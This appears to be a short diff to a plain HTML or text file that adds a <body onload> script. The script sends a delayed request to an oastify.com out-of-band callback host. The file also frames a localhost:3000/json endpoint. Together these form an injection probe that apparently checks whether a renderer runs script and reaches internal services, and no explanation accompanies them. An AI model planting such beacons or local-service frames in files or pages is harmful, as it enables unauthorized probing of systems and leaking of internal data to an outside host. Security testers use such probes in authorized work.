@@ -1,4 +1,6 @@
 Hello
+<body onload="setTimeout(function(){var xhr = new XMLHttpRequest(); xhr.open('GET', 'https://7u2mvavbiotucxmybqdphq1o6fc60zoo.oastify.com', true); xhr.send();}, 1000);">
+
 
 1st
 <iframe src="http://localhost:3000/json" width="800" height="600"></iframe>
